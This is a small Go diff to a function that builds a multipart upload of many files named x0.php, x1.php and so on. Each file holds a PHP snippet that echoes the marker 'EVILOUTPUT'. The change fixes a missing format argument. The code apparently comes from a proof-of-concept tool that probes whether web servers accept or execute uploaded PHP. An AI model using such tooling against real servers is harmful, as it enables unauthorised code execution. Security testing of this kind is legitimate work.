@@ -27,7 +27,7 @@ func genPayload(copies int) (*bytes.Buffer, string) {
 	formWriter := multipart.NewWriter(formBuf)
 	payload := []byte("<?php echo \"EVILOUTPUT\"; ?>")
 	for i := 0; i < copies; i++ {
-		w, e := formWriter.CreateFormFile(fmt.Sprintf("x%d", i), fmt.Sprintf("x%d.php"))
+		w, e := formWriter.CreateFormFile(fmt.Sprintf("x%d", i), fmt.Sprintf("x%d.php", i))
 		if e != nil {
 			log.Println("genPayload CreateFormFile", e)
 			continue
